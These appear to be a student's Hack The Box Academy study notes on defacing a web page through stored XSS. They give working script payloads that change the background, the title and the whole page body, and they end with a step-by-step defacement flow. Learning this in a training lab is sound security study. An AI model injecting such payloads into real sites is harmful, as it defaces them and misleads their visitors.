# Defacing via Stored XSS - CPTS Notes

Defacing is one of the most common real-world impacts of a **Stored XSS vulnerability**. Once an attacker successfully injects JavaScript that gets permanently stored by the application, every visitor who loads the vulnerable page will execute the attacker's code automatically.

A website defacement attack aims to change the appearance of a web page and display an attacker-controlled message. Historically, hacker groups have used website defacement to publicly demonstrate that they successfully compromised a target organization. While defacement may seem cosmetic, it can severely damage an organization's reputation, customer trust, and even stock value.

Stored XSS is particularly dangerous for defacement because the malicious payload is saved on the server and automatically executes whenever users visit the affected page.

**Key point:**

```text
Stored XSS + JavaScript DOM Manipulation
=
Website Defacement
```

---

# Common Elements Used in Defacement

Most website defacement attacks focus on modifying a few visible components of the page rather than rebuilding the entire website.

The four most commonly modified elements are:

| Element          | JavaScript Property              |
| ---------------- | -------------------------------- |
| Background Color | `document.body.style.background` |
| Background Image | `document.body.background`       |
| Page Title       | `document.title`                 |
| Page Content     | `innerHTML`                      |

By modifying these elements, an attacker can completely change how the website appears to visitors.

---

# Changing the Background Color

One of the simplest forms of defacement is changing the page background.

Example payload:

```html
<script>document.body.style.background="#141d2b"</script>
```

This changes the background color to a dark blue color similar to the Hack The Box theme.

The color can be specified using:

* Hex values
* RGB values
* Named colors

Examples:

```html
<script>document.body.style.background="black"</script>
```

```html
<script>document.body.style.background="#000000"</script>
```

Because the payload is stored through Stored XSS, the background modification remains active for all future visitors.

---

# Changing the Background Image

Instead of a solid color, an attacker may display an image as the page background.

Example:

```html
<script>document.body.background="https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

This replaces the normal website background with the specified image.

Background images are commonly used to display:

* Group logos
* Defacement banners
* Political messages
* Warning messages

---

# Changing the Page Title

The page title is the text displayed in the browser tab.

JavaScript can modify it using:

```html
<script>document.title='HackTheBox Academy'</script>
```

Original title:

```text
2Do
```

Modified title:

```text
HackTheBox Academy
```

This is often used by attackers to leave their name or group identity visible even before users open the page.

---

# Changing Page Content

The most noticeable part of a defacement attack is replacing the visible page content.

A common method is using:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

This replaces the contents of a specific DOM element.

Example:

```javascript
document.getElementById("todo").innerHTML = "Website Hacked"
```

---

# Using jQuery

If jQuery is loaded on the page, the same action can be performed using:

```javascript
$("#todo").html("New Text");
```

This provides a shorter and often more convenient syntax.

---

# Replacing the Entire Page

Instead of modifying a single element, attackers often replace the entire page body.

Example:

```javascript
document.getElementsByTagName('body')[0].innerHTML="New Text"
```

This completely removes the existing content and replaces it with attacker-controlled HTML.

The process becomes:

```text
Original Website
       ↓
Stored XSS Executes
       ↓
Body Replaced
       ↓
Defaced Website Appears
```

---

# Creating Custom Defacement Pages

Before injecting the payload, attackers typically prepare custom HTML content.

Example:

```html
<center>
<h1 style="color:white">Cyber Security Training</h1>
<p style="color:white">
by
<img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px">
</p>
</center>
```

This HTML creates:

* A centered heading
* Custom text
* A logo image

Once tested, the HTML is converted into a single-line payload and injected via XSS.

---

# Full Defacement Payload

Example:

```html
<script>document.getElementsByTagName('body')[0].innerHTML='<center><h1 style="color:white">Cyber Security Training</h1><p style="color:white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px"></p></center>'</script>
```

When executed:

```text
Entire Original Page
         ↓
Replaced With
         ↓
Attacker HTML
```

Every visitor now sees the defaced page.

# Complete Defacement Example

A realistic defacement attack may use multiple Stored XSS payloads:

### Change Background

```html
<script>document.body.style.background="#141d2b"</script>
```

### Change Title

```html
<script>document.title='HackTheBox Academy'</script>
```

### Replace Content

```html
<script>document.getElementsByTagName('body')[0].innerHTML='<center><h1 style="color:white">Cyber Security Training</h1><p style="color:white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px"></p></center>'</script>
```

Combined effect:

```text
Dark Background
       +
Modified Browser Title
       +
Custom HTML Content
       =
Website Defacement
```

# Why the Original Source Code Still Exists

When examining the page source after the attack, the original website code often remains intact.

Example:

```html
<div></div>

<script>document.body.style.background="#141d2b"</script>

<script>document.title='HackTheBox Academy'</script>

<script>document.getElementsByTagName('body')[0].innerHTML='...'</script>
```

The reason is:

```text
JavaScript does not remove source code.
JavaScript modifies the DOM after execution.
```

The browser loads the original page and then executes the injected scripts, which visually transform the website.

# Real-World Defacement Flow

```text
1. Discover Stored XSS
2. Inject Persistent JavaScript
3. Modify Background
4. Change Page Title
5. Replace Page Content
6. Save Payload
7. Visitors Open Page
8. Browser Executes Payload
9. Website Appears Defaced
```
